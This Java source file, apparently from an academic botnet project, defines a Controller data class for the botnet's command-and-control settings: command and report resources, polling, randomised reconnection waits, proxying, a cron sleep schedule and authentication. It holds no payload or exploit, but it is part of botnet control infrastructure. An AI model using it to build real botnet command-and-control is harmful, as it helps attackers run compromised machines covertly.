/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.control;

import com.acmutv.botnet.core.control.command.BotCommand;
import com.acmutv.botnet.tool.net.HttpProxy;
import com.acmutv.botnet.tool.time.Interval;
import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NonNull;

import java.util.HashMap;
import java.util.Map;

/**
 * A simple Command and Control model.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see BotCommand
 */
@AllArgsConstructor
@Data
public class Controller {

  /**
   * The resource providing configuration.
   */
  @NonNull
  private final String initResource;

  /**
   * The resource providing command.
   */
  @NonNull
  private final String cmdResource;

  /**
   * The resource to push reports to.
   */
  @NonNull
  private final String logResource;

  /**
   * The polling period.
   */
  private Interval polling = null;

  /**
   * The maximum number of connection errors tolerated.
   */
  private Long reconnections = null;

  /**
   * The period between reconnections, as random number within this interval.
   */
  private Interval reconnectionWait = null;

  /**
   * The proxy server to connect through.
   */
  private HttpProxy proxy = null;

  /**
   * The cron expression that sets up the sleep mode.
   */
  private String sleep = null;

  /**
   * The controller authentication fields.
   */
  private Map<String,String> authentication = null;

  /**
   * Creates a new Controller with the specific resources and all other parameters set to null.
   * @param initResource the initialization resource.
   * @param cmdResource the command resource.
   * @param logResource the logging resource.
   */
  public Controller(String initResource, String cmdResource, String logResource) {
    this.initResource = initResource;
    this.cmdResource = cmdResource;
    this.logResource = logResource;
  }

  /**
   * Returns `polling` if not null; `fallback` otherwise.
   * @param fallback the fallback value.
   * @return `polling` if not null; `fallback` otherwise.
   */
  public Interval getPolling(Interval fallback) {
    return (this.polling != null) ? this.polling : fallback;
  }

  /**
   * Returns `reconnections` if not null; `fallback` otherwise.
   * @param fallback the fallback value.
   * @return `reconnections` if not null; `fallback` otherwise.
   */
  public Long getReconnections(Long fallback) {
    return (this.reconnections != null) ? this.reconnections : fallback;
  }

  /**
   * Returns `reconnectionWait` if not null; `fallback` otherwise.
   * @param fallback the fallback value.
   * @return `reconnectionWait` if not null; `fallback` otherwise.
   */
  public Interval getReconnectionWait(Interval fallback) {
    return (this.reconnectionWait != null) ? this.reconnectionWait : fallback;
  }

  /**
   * Returns `proxy` if not null; `fallback` otherwise.
   * @param fallback the fallback value.
   * @return `proxy` if not null; `fallback` otherwise.
   */
  public HttpProxy getProxy(HttpProxy fallback) {
    return (this.proxy != null) ? this.proxy : fallback;
  }

  /**
   * Returns `sleep` if not null; `fallback` otherwise.
   * @param fallback the fallback value.
   * @return `proxy` if not null; `fallback` otherwise.
   */
  public String getSleep(String fallback) {
    return (this.sleep != null) ? this.sleep : fallback;
  }

  /**
   * Returns `properties` if not null; `fallback` otherwise.
   * @param fallback the fallback value.
   * @return `proxy` if not null; `fallback` otherwise.
   */
  public Map<String,String> getAuthentication(Map<String,String> fallback) {
    return (this.authentication != null) ? this.authentication : fallback;
  }
}
